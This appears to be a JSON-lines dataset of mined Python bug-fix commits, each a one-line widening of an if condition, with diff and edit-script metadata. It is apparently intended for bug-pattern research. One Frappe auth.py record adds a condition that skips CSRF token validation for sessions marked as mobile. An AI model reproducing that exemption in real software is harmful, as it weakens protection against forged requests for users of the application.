{"project": "erpnext", "commit_sha": "3191d072f0f690c7d5fd905d123d1d1aa68afd7a", "parent_sha": "0af45b41d78158f3c32dd00e5703886c1b5421cf", "file_path": "erpnext/accounts/doctype/payment_entry/payment_entry.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ class PaymentEntry(AccountsController):\n \t\t\t\t\td.reference_name, self.party_account_currency)\n \n \t\t\t\tfor field, value in iteritems(ref_details):\n-\t\t\t\t\tif not d.get(field) or force:\n+\t\t\t\t\tif field == 'exchange_rate' or not d.get(field) or force:\n \t\t\t\t\t\td.set(field, value)\n \n \tdef validate_payment_type(self):\n", "before": "if not d . get ( field ) or force : d . set ( field , value )", "after": "if field == 'exchange_rate' or not d . get ( field ) or force : d . set ( field , value )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 6, 4, 26], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 9, 3, 34], 2], [\"Insert\", \"N1\", [\"identifier:field\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'exchange_rate'\", \"T\"], 2]]"}
{"project": "AIS-home-assistant", "commit_sha": "63820a78d95f364581f7d7f175a000eeb2030e29", "parent_sha": "61a3b4ffdb7f7e40e000d4ca51b3db58811b260d", "file_path": "homeassistant/components/device_tracker/asuswrt.py", "project_url": "https://github.com/sviete/AIS-home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -172,7 +172,7 @@ class AsusWrtDeviceScanner(DeviceScanner):\n \n         ret_devices = {}\n         for key in devices:\n-            if devices[key].ip is not None:\n+            if self.mode == 'ap' or devices[key].ip is not None:\n                 ret_devices[key] = devices[key]\n         return ret_devices\n \n", "before": "if devices [ key ] . ip is not None : ret_devices [ key ] = devices [ key ]", "after": "if self . mode == 'ap' or devices [ key ] . ip is not None : ret_devices [ key ] = devices [ key ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 48], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 43], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'ap'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:mode\", \"T\"], 2]]"}
{"project": "weboob", "commit_sha": "be990c150fd0a2174392409821a1b4de16084bcb", "parent_sha": "a1937e0c8282b3fbbbebd77b27b40eaf1f73c65a", "file_path": "weboob/backends/cragr/browser.py", "project_url": "https://github.com/vicnet/weboob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ class Cragr(BaseBrowser):\n             raise BrowserIncorrectPassword()\n \n     def get_accounts_list(self):\n-        if not self.is_on_page(pages.AccountsList):\n+        if not self.is_on_page(pages.AccountsList) or self.page.is_account_page():\n             self.home()\n         return self.page.get_list()\n \n", "before": "if not self . is_on_page ( pages . AccountsList ) : self . home ( )", "after": "if not self . is_on_page ( pages . AccountsList ) or self . page . is_account_page ( ) : self . home ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 51], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 51], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:is_account_page\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"):)\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:page\", \"T\"], 2]]"}
{"project": "frappe", "commit_sha": "7b74c1fe9b9f4478a1f2905b72b7f2b788970895", "parent_sha": "15c2925cbb974c229bdbf128c6093acc056468d9", "file_path": "frappe/desk/doctype/feed/feed.py", "project_url": "https://github.com/sjc-waterloo/frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def update_feed(doc, method=None):\n \tif frappe.flags.in_patch or frappe.flags.in_install or frappe.flags.in_import:\n \t\treturn\n \n-\tif doc.doctype == \"Feed\":\n+\tif doc.doctype == \"Feed\" or doc.meta.issingle:\n \t\treturn\n \n \tif hasattr(doc, \"get_feed\"):\n", "before": "if doc . doctype == \"Feed\" : return", "after": "if doc . doctype == \"Feed\" or doc . meta . issingle : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 2, 4, 9], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 5, 3, 26], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:issingle\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:doc\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:meta\", \"T\"], 2]]"}
{"project": "frappe", "commit_sha": "6e9fb3b04c83f23c0ed9ddeeace7cd1c508e4d17", "parent_sha": "623b271c113aabfd92f116899e19f8c043fdfd27", "file_path": "frappe/core/doctype/docshare/docshare.py", "project_url": "https://github.com/sjc-waterloo/frappe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class DocShare(Document):\n \t\tself.get_doc().run_method(\"validate_share\", self)\n \n \tdef cascade_permissions_downwards(self):\n-\t\tif self.write:\n+\t\tif self.share or self.write:\n \t\t\tself.read = 1\n \n \tdef get_doc(self):\n", "before": "if self . write : self . read = 1", "after": "if self . share or self . write : self . read = 1", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 4, 17], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 6, 3, 16], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:share\", \"T\"], 2]]"}
{"project": "frappe-v7.2.29", "commit_sha": "45583f30fe9ae5b355ae985bdfaed792bf2d4b9d", "parent_sha": "cf0d865e1d582eda3d6019c7ed5136920ed47a8a", "file_path": "frappe/auth.py", "project_url": "https://github.com/lukptr/frappe-v7.2.29", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class HTTPRequest:\n \n \tdef validate_csrf_token(self):\n \t\tif frappe.local.request and frappe.local.request.method==\"POST\":\n-\t\t\tif not frappe.local.session.data.csrf_token:\n+\t\t\tif not frappe.local.session.data.csrf_token or frappe.local.session.data.device==\"mobile\":\n \t\t\t\t# not via boot\n \t\t\t\treturn\n \n", "before": "if not frappe . local . session . data . csrf_token : return", "after": "if not frappe . local . session . data . csrf_token or frappe . local . session . data . device == \"mobile\" : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 7, 3, 47], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 11, 3, 47], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"mobile\\\"\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:device\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:data\", \"T\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:session\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:frappe\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:local\", \"T\"], 2]]"}
{"project": "TicketMoverPlugin", "commit_sha": "639f054dc0e278a7754b0d64884eb5a493bef21e", "parent_sha": "c992a0309dab8f6a0e0276abcd2ece524835be6f", "file_path": "0.11/ticketmoverplugin/web_ui.py", "project_url": "https://github.com/trac-hacks/TicketMoverPlugin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class TicketMoverSidebar(Component):\n     ### methods for ITicketSidebarProvider\n \n     def enabled(self, req, ticket):\n-        if not self.permission in req.perm:\n+        if not self.permission in req.perm or not ticket.exists:\n             return False\n         tm = TicketMover(self.env)\n         projects = tm.projects(req.authname)\n", "before": "if not self . permission in req . perm : return False", "after": "if not self . permission in req . perm or not ticket . exists : return False", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 43], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:ticket\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:exists\", \"T\"], 2]]"}
{"project": "w3af", "commit_sha": "a0b44da5d811998638a64c0b9c4ef537a61b47d2", "parent_sha": "3483fd4347060fccf4cabf5f3cf91982d078d2b1", "file_path": "lib/request/inject.py", "project_url": "https://github.com/stevenchen0x01/w3af", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def _goInference(payload, expression, charsetType=None, firstChar=None, lastChar\n                 if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n                     expression += \" AS %s\" % randomStr(lowercase=True)\n \n-            if field and conf.hexConvert:\n+            if field and conf.hexConvert or conf.binaryFields and field in conf.binaryFields.split(','):\n                 nulledCastedField = agent.nullAndCastField(field)\n                 injExpression = expression.replace(field, nulledCastedField, 1)\n             else:\n", "before": "if field and conf . hexConvert : nulledCastedField = agent . nullAndCastField ( field ) injExpression = expression . replace ( field , nulledCastedField , 1 ) else : ", "after": "if field and conf . hexConvert or conf . binaryFields and field in conf . binaryFields . split ( ',' ) : nulledCastedField = agent . nullAndCastField ( field ) injExpression = expression . replace ( field , nulledCastedField , 1 ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 41], [\"boolean_operator\", 3, 16, 3, 41], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 41], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 41], [\"boolean_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N2\"], 2], [\"Insert\", \"N1\", [\"identifier:conf\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:binaryFields\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:field\", \"T\"], 0], [\"Insert\", \"N2\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N2\", [\"call\", \"N3\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N4\", [\"attribute\", \"N6\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:split\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"string:','\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2], [\"Insert\", \"N6\", [\"identifier:conf\", \"T\"], 0], [\"Insert\", \"N6\", [\".:.\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:binaryFields\", \"T\"], 2]]"}
{"project": "you-get", "commit_sha": "6874ab35d2b18a1090ec120a8a5b8af4b393e931", "parent_sha": "1e41302690ee83e848ded207a7c876878aafc351", "file_path": "src/you_get/extractors/cntv.py", "project_url": "https://github.com/grizzlybears/you-get", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def cntv_download_by_id(id, title = None, output_dir = '.', merge = True, info_o\n         download_urls(urls, title, ext, size, output_dir = output_dir, merge = merge)\n \n def cntv_download(url, output_dir = '.', merge = True, info_only = False):\n-    if re.match(r'http://\\w+\\.cntv\\.cn/(\\w+/\\w+/(classpage/video/)?)?\\d+/\\d+\\.shtml', url):\n+    if re.match(r'http://\\w+\\.cntv\\.cn/(\\w+/\\w+/(classpage/video/)?)?\\d+/\\d+\\.shtml', url) or re.match(r'http://\\w+.cntv.cn/(\\w+/)*VIDE\\d+.shtml', url):\n         id = r1(r'<!--repaste.video.code.begin-->(\\w+)<!--repaste.video.code.end-->', get_html(url))\n     elif re.match(r'http://xiyou.cntv.cn/v-[\\w-]+\\.html', url):\n         id = r1(r'http://xiyou.cntv.cn/v-([\\w-]+)\\.html', url)\n", "before": "if re . match ( r'http://\\w+\\.cntv\\.cn/(\\w+/\\w+/(classpage/video/)?)?\\d+/\\d+\\.shtml' , url ) : id = r1 ( r'<!--repaste.video.code.begin-->(\\w+)<!--repaste.video.code.end-->' , get_html ( url ) ) elif re . match ( r'http://xiyou.cntv.cn/v-[\\w-]+\\.html' , url ) : id = r1 ( r'http://xiyou.cntv.cn/v-([\\w-]+)\\.html' , url )", "after": "if re . match ( r'http://\\w+\\.cntv\\.cn/(\\w+/\\w+/(classpage/video/)?)?\\d+/\\d+\\.shtml' , url ) or re . match ( r'http://\\w+.cntv.cn/(\\w+/)*VIDE\\d+.shtml' , url ) : id = r1 ( r'<!--repaste.video.code.begin-->(\\w+)<!--repaste.video.code.end-->' , get_html ( url ) ) elif re . match ( r'http://xiyou.cntv.cn/v-[\\w-]+\\.html' , url ) : id = r1 ( r'http://xiyou.cntv.cn/v-([\\w-]+)\\.html' , url )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 63], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 91], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:re\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:match\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:r'http://\\\\w+.cntv.cn/(\\\\w+/)*VIDE\\\\d+.shtml'\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:url\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4]]"}
{"project": "pydal", "commit_sha": "fae29bf0e199d54c9aa7e9022c0e9d663ea0e432", "parent_sha": "b0f6f29de564187c68b3d104cfc85b2247df2f74", "file_path": "gluon/validators.py", "project_url": "https://github.com/gi0baro/pydal", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2341,7 +2341,7 @@ class IS_DATETIME(Validator):\n             return (ovalue, translate(self.error_message) % self.extremes)\n \n     def formatter(self, value):\n-        if value is None:\n+        if value is None or value == '':\n             return None\n         format = self.format\n         year = value.year\n", "before": "if value is None : return None", "after": "if value is None or value == '' : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 24], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:''\", \"T\"], 2]]"}
{"project": "boto", "commit_sha": "096c7c9027cf3bcf9a97160f2c6c1d78c60214de", "parent_sha": "555de66459dd796c71babf6b96d938369f16a676", "file_path": "boto/ec2/blockdevicemapping.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class BlockDeviceMapping(dict):\n         self.current_value = None\n \n     def startElement(self, name, attrs, connection):\n-        if name == 'ebs':\n+        if name == 'ebs' or name == 'virtualName':\n             self.current_value = BlockDeviceType(self)\n             return self.current_value\n \n", "before": "if name == 'ebs' : self . current_value = BlockDeviceType ( self ) return self . current_value", "after": "if name == 'ebs' or name == 'virtualName' : self . current_value = BlockDeviceType ( self ) return self . current_value", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 38], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:name\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'virtualName'\", \"T\"], 2]]"}
{"project": "boto", "commit_sha": "4fa07e6b3775c8b9a87fc2c74c2a8bc671f84806", "parent_sha": "dc1363a8b818b60643f9a2fafd3cce5a11eae12c", "file_path": "boto/sdb/db/property.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class Property(object):\n         self.slot_name = '_' + self.name\n \n     def default_validator(self, value):\n-        if value == self.default_value():\n+        if isinstance(value, basestring) or value == self.default_value():\n             return\n         if not isinstance(value, self.data_type):\n             raise TypeError, 'Validation Error, expecting %s, got %s' % (self.data_type, type(value))\n", "before": "if value == self . default_value ( ) : return", "after": "if isinstance ( value , basestring ) or value == self . default_value ( ) : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 19], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 41], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:value\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:basestring\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "invenio", "commit_sha": "258eac466bb3e87f34a9b58fc9ea8ef9f88c2911", "parent_sha": "62579b2d1d4f7f041075a4f570b72d28da3a8efa", "file_path": "modules/bibauthorid/lib/bibauthorid_name_utils.py", "project_url": "https://github.com/fpoli/invenio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -658,7 +658,7 @@ def surname_compatibility(sa, sb):\n     ml = float(max(len(sa),len(sb)))\n     name_comparison_print('|--- dist:%s, ml:%s' % (dist,ml))\n \n-    if dist/ml > MAX_ALLOWED_SURNAME_DISTANCE_PERCENT:\n+    if ml==0 or dist/ml > MAX_ALLOWED_SURNAME_DISTANCE_PERCENT:\n         return 0.0\n     else:\n         return 1.-float(dist)/max(len(sa),len(sb))\n", "before": "if dist / ml > MAX_ALLOWED_SURNAME_DISTANCE_PERCENT : return 0.0 else : return 1. - float ( dist ) / max ( len ( sa ) , len ( sb ) )", "after": "if ml == 0 or dist / ml > MAX_ALLOWED_SURNAME_DISTANCE_PERCENT : return 0.0 else : return 1. - float ( dist ) / max ( len ( sa ) , len ( sb ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 51], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 54], 2], [\"Insert\", \"N1\", [\"identifier:ml\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2]]"}
{"project": "qutebrowser", "commit_sha": "d260b26105c0b308b79daeca223fb5dc72994428", "parent_sha": "dfd3b3d9c446601fa30ba94488b683a72dd25673", "file_path": "qutebrowser/utils/objreg.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ def _get_window_registry(win_id):\n     if win_id == 'current':\n         app = get('app')\n         win = app.activeWindow()\n-        if win is None:\n+        if win is None or not hasattr(win, 'win_id'):\n             raise RegistryUnavailableError('window')\n         else:\n             win_id = win.win_id\n", "before": "if win is None : raise RegistryUnavailableError ( 'window' ) else : win_id = win . win_id", "after": "if win is None or not hasattr ( win , 'win_id' ) : raise RegistryUnavailableError ( 'window' ) else : win_id = win . win_id", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 32], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 23], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:win\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"string:'win_id'\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4]]"}
{"project": "qutebrowser", "commit_sha": "2c719006cf42c7fc990ba7fd26b7c94639b21aa9", "parent_sha": "240e271b0d7983d20e2e816465b6c1c56e4adddb", "file_path": "tests/conftest.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ def _apply_platform_markers(item):\n \n     for searched_marker, condition, default_reason in markers:\n         marker = item.get_marker(searched_marker)\n-        if not marker:\n+        if not marker or not condition:\n             continue\n \n         if 'reason' in marker.kwargs:\n", "before": "if not marker : continue", "after": "if not marker or not condition : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 22], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:marker\", 3, 16, 3, 22], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:condition\", \"T\"], 1]]"}
{"project": "qutebrowser", "commit_sha": "e22ef776f9609af9dcff966b8ca2f695cf910ca3", "parent_sha": "b5a70dbdec4916c21493e558aaf618eca3668c61", "file_path": "qutebrowser/mainwindow/tabbedbrowser.py", "project_url": "https://github.com/ludat/qutebrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -296,7 +296,7 @@ class TabbedBrowser(tabwidget.TabWidget):\n         qtutils.ensure_valid(url)\n-        if newtab:\n+        if newtab or self.currentWidget() is None:\n             self.tabopen(url, background=False)\n         else:\n             self.currentWidget().openurl(url)\n", "before": "if newtab : self . tabopen ( url , background = False ) else : self . currentWidget ( ) . openurl ( url )", "after": "if newtab or self . currentWidget ( ) is None : self . tabopen ( url , background = False ) else : self . currentWidget ( ) . openurl ( url )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 1, 9, 4, 46], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:newtab\", 1, 12, 1, 18], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:currentWidget\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"):)\", \"T\"], 1]]"}
{"project": "buildbot", "commit_sha": "183b1724a1adc0dd980b62271a4addff02f512b8", "parent_sha": "6f2cb260da96f2730c667879e3177214b3ff298e", "file_path": "buildbot/steps/source.py", "project_url": "https://github.com/sigma-star/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -395,7 +395,7 @@ class SVN(Source):\n \n \n     def computeSourceRevision(self, changes):\n-        if not changes:\n+        if not changes or None in [c.revision for c in changes]:\n             return None\n         lastChange = max([int(c.revision) for c in changes])\n         return lastChange\n", "before": "if not changes : return None", "after": "if not changes or None in [ c . revision for c in changes ] : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 23], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:changes\", 3, 16, 3, 23], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"list_comprehension\", \"N2\"], 2], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 1], [\"Insert\", \"N2\", [\"for_in_clause\", \"N4\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"identifier:c\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:revision\", \"T\"], 2], [\"Insert\", \"N4\", [\"for:for\", \"T\"], 0], [\"Insert\", \"N4\", [\"identifier:c\", \"T\"], 1], [\"Insert\", \"N4\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:changes\", \"T\"], 3]]"}
